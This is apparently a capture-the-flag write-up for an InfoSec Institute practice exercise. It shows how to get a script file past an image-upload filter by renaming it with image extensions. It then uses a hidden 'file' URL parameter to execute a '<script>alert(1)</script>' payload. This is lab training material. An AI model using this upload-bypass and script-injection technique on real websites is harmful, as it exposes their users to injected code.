# File inclusion

1.	The first step is to analyse the application. Let's try in uploading a real
	image file. Of course the application replies us with

		File uploaded successfully

	Take a note...

2.	Now, we'll try in renaming our file with a non-image extension

		$ cp duck_43ed2fd0.jpg duck_43ed2fd0.jpg.txt

	Also in this case, the application replies us with

		File uploaded successfully

	It seems that a check on the file's signature is performed. Take a note...

3. Let's create a fake image file containing the JS code that we
	want to be executed

		$ echo "<script>alert(1);</script>" > script.js
		$ cp script.js f737c5cf_script.js

	We added the `f737c5cf_` prefix just to be sure that we're working with our
	file. If we try to upload it, we receive the message

		Your file does not have the proper extension.

	Take a note...

4.	Let's change the file extension

		$ cp f737c5cf_script.js f737c5cf_script.js.png

	and try to upload it. The result is

		File uploaded successfully

	Well!!! We was able to upload a JS code on the server. Now, we need to find
	a way to execute it.

5.	By clicking on `Chess 1` link, we can see that the URL changes in

		http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=1

	So, the uploaded files are referenced with an `attachment_id`. Let's try in
	using the 120 as id.

		http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?attachment_id=120

	We'll receive

		This attachment is currently under review by our editors.

	Take a note...

6.	Go back to the "Chess 1" page and take a look at the source code. We can see
	that image files are stored under

		http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/

	So, let's try in accessing the image that we just uploaded

		http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/duck_43ed2fd0.jpg

	We should see a rubber duck. Why we should not be able in accessing out
	fake image (f737c5cf_script.js.png)? Let's try with

		http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/f737c5cf_script.js.png

	It works, but we receive the browser error

		The image "http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/f737c5cf_script.js.png"
		cannot be displayed, because it contains errors.

	We should be near the solution...

7.	After some attempts, I found this. If we add an extension to the URL

		http://ctf.infosecinstitute.com/ctf2/ex8_assets/img/f737c5cf_script.js.png.xyz
		                                                                           ^^^

	We're redirected to

		http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=f737c5cf_script.js.png.xyz
		                                                       ^^^^

	As we can see, a new parameter appeared (`file`). Let's try in removing the
	`.xyz` suffix

		http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=f737c5cf_script.js.png

	We'll receive

		Your file does not contain the right code

	Mmmm... seems that the code that we wrote is not good. Let's try in doing this

		$ echo "<html><script>alert(1);</script></html>" > f737c5cf_script.js.jpg

	Then, upload the `f737c5cf_script.js.jpg` file. After that, try visiting

		http://ctf.infosecinstitute.com/ctf2/exercises/ex8.php?file=f737c5cf_script.js.jpg

	Yep!

		Hehe, we hope that didn't took you long. Expect a redirect in the usual time.

[Go to Ex7](./ex7.md) | [Go to Ex9](./ex9.md)

